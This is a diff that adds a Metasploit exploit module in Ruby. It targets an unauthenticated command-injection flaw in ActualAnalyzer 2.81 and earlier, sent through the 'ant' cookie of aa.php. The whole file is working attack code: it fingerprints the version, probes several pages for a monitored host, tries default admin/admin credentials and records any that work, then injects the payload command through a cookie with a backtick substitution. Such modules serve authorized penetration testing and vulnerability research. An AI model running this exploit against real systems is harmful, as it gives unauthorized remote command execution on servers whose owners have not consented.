@@ -1,0 +1,264 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name'            => "ActualAnalyzer 'ant' Cookie Command Execution",
+      'Description'     => %q{
+        This module exploits a command execution vulnerability in
+        ActualAnalyzer version 2.81 and prior.
+
+        The 'aa.php' file allows unauthenticated users to
+        execute arbitrary commands in the 'ant' cookie.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Benjamin Harris', # Discovery and exploit
+          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
+        ],
+      'References'      =>
+        [
+          ['EDB', '34450'],
+          ['OSVDB', '110601']
+        ],
+      'Payload'         =>
+        {
+          'Space'       => 4096, # HTTP cookie
+          'DisableNops' => true,
+          'BadChars'    => "\x00"
+        },
+      'Arch'            => ARCH_CMD,
+      'Platform'        => 'unix',
+      'Targets'         =>
+        [
+          # Tested on ActualAnalyzer versions 2.81 and 2.75 on Ubuntu
+          ['ActualAnalyzer <= 2.81', { 'auto' => true }]
+        ],
+      'Privileged'      => false,
+      'DisclosureDate'  => 'Aug 28 2014',
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to ActualAnalyzer', '/lite/']),
+        OptString.new('USERNAME', [false, 'The username for ActualAnalyzer', 'admin']),
+        OptString.new('PASSWORD', [false, 'The password for ActualAnalyzer', 'admin']),
+        OptString.new('ANALYZER_HOST', [false, 'A hostname or IP monitored by ActualAnalyzer', ''])
+      ], self.class)
+  end
+
+  #
+  # Checks if target is running ActualAnalyzer <= 2.81
+  #
+  def check
+    # check for aa.php
+    res = send_request_raw('uri' => normalize_uri(target_uri.path, 'aa.php'))
+    if !res
+      vprint_error("#{peer} - Connection failed")
+      return Exploit::CheckCode::Unknown
+    elsif res.code == 404
+      vprint_error("#{peer} - Could not find aa.php")
+      return Exploit::CheckCode::Safe
+    elsif res.code == 200 && res.body =~ /ActualAnalyzer Lite/ && res.body =~ /Admin area<\/title>/
+      vprint_error("#{peer} - ActualAnalyzer is not installed. Try installing first.")
+      return Exploit::CheckCode::Detected
+    end
+    # check version
+    res = send_request_raw('uri' => normalize_uri(target_uri.path, 'view.php'))
+    if !res
+      vprint_error("#{peer} - Connection failed")
+      return Exploit::CheckCode::Unknown
+    elsif res.code == 200 && /title="ActualAnalyzer Lite \(free\) (?<version>[\d\.]+)"/ =~ res.body
+      vprint_status("#{peer} - Found version: #{version}")
+      if Gem::Version.new(version) <= Gem::Version.new('2.81')
+        report_vuln(
+          host: rhost,
+          name: self.name,
+          info: "Module #{fullname} detected ActualAnalyzer #{version}",
+          refs: references,
+        )
+        return Exploit::CheckCode::Vulnerable
+      end
+      return Exploit::CheckCode::Detected
+    elsif res.code == 200 && res.body =~ /ActualAnalyzer Lite/
+      return Exploit::CheckCode::Detected
+    end
+    Exploit::CheckCode::Safe
+  end
+
+  #
+  # Try to retrieve a valid analytics host from view.php unauthenticated
+  #
+  def get_analytics_host_view
+    analytics_host = nil
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'view.php'),
+      'vars_post' => {
+        'id_h' => '',
+        'listp' => '',
+        'act_h' => 'vis_int',
+        'oldact' => 'vis_grpg',
+        'tint_h' => '',
+        'extact_h' => '',
+        'home_pos' => '',
+        'act' => 'vis_grpg',
+        'tint' => 'total',
+        'grpg' => '201',
+        'cp_vst' => 'on',
+        'cp_hst' => 'on',
+        'cp_htst' => 'on',
+        'cp_reps' => 'y',
+        'tab_sort' => '1_1'
+      }
+    )
+    if !res
+      vprint_error("#{peer} - Connection failed")
+    elsif /<option value="?[\d]+"?[^>]*>Page: https?:\/\/(?<analytics_host>[^\/^<]+)/ =~ res.body
+      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
+      return analytics_host
+    else
+      vprint_status("#{peer} - Could not find any hosts on view.php")
+    end
+    nil
+  end
+
+  #
+  # Try to retrieve a valid analytics host from code.php unauthenticated
+  #
+  def get_analytics_host_code
+    analytics_host = nil
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'code.php'),
+      'vars_get' => {
+        'pid' => '1'
+      }
+    )
+    if !res
+      vprint_error("#{peer} - Connection failed")
+    elsif res.code == 200 && /alt='ActualAnalyzer' src='https?:\/\/(?<analytics_host>[^\/^']+)/ =~ res.body
+      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
+      return analytics_host
+    else
+      vprint_status("#{peer} - Could not find any hosts on code.php")
+    end
+    nil
+  end
+
+  #
+  # Try to retrieve a valid analytics host from admin.php with creds
+  #
+  def get_analytics_host_admin
+    analytics_host = nil
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'admin.php'),
+      'vars_post' => {
+        'uname' => user,
+        'passw' => pass,
+        'id_h' => '',
+        'listp' => '',
+        'act_h' => '',
+        'oldact' => 'pages',
+        'tint_h' => '',
+        'extact_h' => '',
+        'param_h' => '',
+        'param2_h' => '',
+        'home_pos' => '',
+        'act' => 'dynhtml',
+        'set.x' => '11',
+        'set.y' => '11'
+      }
+    )
+    if !res
+      vprint_error("#{peer} - Connection failed")
+    elsif res.code == 200 && res.body =~ />Login</
+      vprint_status("#{peer} - Login failed.")
+    elsif res.code == 200 && /alt='ActualAnalyzer' src='https?:\/\/(?<analytics_host>[^\/^']+)/ =~ res.body
+      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
+      print_good("#{peer} - Login successful! (#{user}:#{pass})")
+      service_data = {
+        address: Rex::Socket.getaddress(rhost, true),
+        port: rport,
+        service_name: (ssl ? 'https' : 'http'),
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+      }
+      credential_data = {
+        origin_type: :service,
+        module_fullname: fullname,
+        private_type: :password,
+        private_data: pass,
+        username: user
+      }
+      credential_data.merge!(service_data)
+      credential_core = create_credential(credential_data)
+      login_data = {
+        core: credential_core,
+        last_attempted_at: DateTime.now,
+        status: Metasploit::Model::Login::Status::SUCCESSFUL
+      }
+      login_data.merge!(service_data)
+      create_credential_login(login_data)
+      return analytics_host
+    else
+      vprint_status("#{peer} - Could not find any hosts on admin.php")
+    end
+    nil
+  end
+
+  def execute_command(cmd, opts = { analytics_host: vhost })
+    vuln_cookies = %w(anw anm)
+    res = send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'aa.php'),
+      'vars_get' => { 'anp' => opts[:analytics_host] },
+      'cookie' => "ant=#{cmd}; #{vuln_cookies.sample}=#{rand(100...999)}.`$cot`"
+    )
+    if !res
+      fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out")
+    elsif res.code == 302 && res.headers['Content-Type'] =~ /image/
+      print_good("#{peer} - Payload sent successfully")
+      return true
+    elsif res.code == 302 && res.headers['Location'] =~ /error\.gif/
+      vprint_status("#{peer} - Host '#{opts[:analytics_host]}' is not monitored by ActualAnalyzer.")
+    elsif res.code == 200 && res.body =~ /Admin area<\/title>/
+      fail_with(Failure::Unknown, "#{peer} - ActualAnalyzer is not installed. Try installing first.")
+    else
+      fail_with(Failure::Unknown, "#{peer} - Something went wrong")
+    end
+    nil
+  end
+
+  def exploit
+    return unless check == Exploit::CheckCode::Vulnerable
+    analytics_hosts = []
+    if datastore['ANALYZER_HOST'].blank?
+      analytics_hosts << get_analytics_host_code
+      analytics_hosts << get_analytics_host_view
+      analytics_hosts << get_analytics_host_admin
+      analytics_hosts << vhost
+      analytics_hosts << '127.0.0.1'
+      analytics_hosts << 'localhost'
+    else
+      analytics_hosts << datastore['ANALYZER_HOST']
+    end
+    analytics_hosts.uniq.each do |host|
+      next if host.nil?
+      vprint_status("#{peer} - Trying hostname '#{host}' - Sending payload (#{payload.encoded.length} bytes)...")
+      break if execute_command(payload.encoded, analytics_host: host)
+    end
+  end
+end
